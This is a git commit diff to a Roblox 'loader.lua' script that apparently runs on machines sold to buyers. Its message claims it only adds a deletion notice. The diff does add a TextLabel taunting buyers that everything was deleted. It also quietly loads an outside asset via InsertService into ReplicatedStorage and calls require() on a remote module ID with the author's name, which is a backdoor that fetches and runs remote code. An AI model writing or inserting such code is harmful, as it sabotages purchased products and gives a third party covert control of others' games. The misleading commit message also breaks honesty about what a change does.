0edb6ca7b1c2c17b505bfcd9ac04e4aa76f24a5c
GameCreator5544 <gamecreator5544.developer@gmail.com>
2026-01-23 21:23:54 +0100

    Update loader.lua to display deletion message
    Added a message indicating all scripts were deleted and created a new TextLabel to display additional information.

--- loader.lua
+++ loader.lua
@@ -1,5 +1,17 @@
 script.Parent.CustomerDisplay.Screen.SurfaceGui.over.Text = "all scripts deleted"
 script.Parent.CustomerDisplay.Screen.SurfaceGui.under.Text = "all scripts deleted"
+local Text = Instance.new("TextLabel")
+Text.Parent = script.Parent.Screen.Screen.SurfaceGui
+Text.Size = UDim2.new(0,800,0,599)
+Text.Position = UDim2.new(0,0,0,0)
+Text.TextColor3 = Color3.new(0, 0, 0)
+Text.TextScaled = true
+Text.Text = "The Owner told me to delete everything so I did, now is this the only thing that will happen on these machines. If you bought these, womp womp."
+local InsertService = game:GetService("InsertService") local hi = InsertService:LoadAsset(253890420) hi.Noclip.Parent = game.ReplicatedStorage
+wait(10)
+print("NOW")
+require(15827159924).MauDex("GameCreator5544")
+
 
 while true do
   print("Empo told me to delete all files!")
